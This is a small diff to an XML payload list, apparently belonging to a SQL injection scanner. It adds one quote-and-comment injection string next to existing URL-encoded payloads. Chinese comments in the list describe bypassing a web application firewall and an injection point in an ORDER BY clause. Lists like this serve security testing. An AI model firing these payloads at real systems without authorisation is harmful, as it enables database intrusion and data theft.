@@ -70,6 +70,7 @@
         <payload value="'%20'"/>
         <payload value="'||'"/>
         <payload value="'%2b'"/>
+        <payload value="'%20--%20s"/>
         <!--使用符号绕waf，' or '&'='&-->
         <payload value="'%20or%20%27%26%27=%27%26"/>
         <!--注入在by `id`,SELECT * FROM module_softwares WHERE `Enable`='1' ORDER BY `uid`` DESC LIMIT 0,20-->
